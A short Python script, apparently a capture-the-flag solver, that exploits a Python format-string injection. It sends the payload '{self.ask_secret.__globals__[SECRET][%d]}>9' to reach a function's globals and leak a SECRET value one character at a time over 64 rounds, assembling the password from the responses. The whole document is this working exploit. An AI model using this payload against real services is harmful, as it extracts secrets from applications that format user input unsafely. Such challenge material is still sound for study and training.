#!/usr/bin/env python3

password = ""

for i in range(64):
    print(0)
    print("{self.ask_secret.__globals__[SECRET][%d]}>9" % (i,))
    input()
    input()
    password += input()[10]
    print(password)
    input()
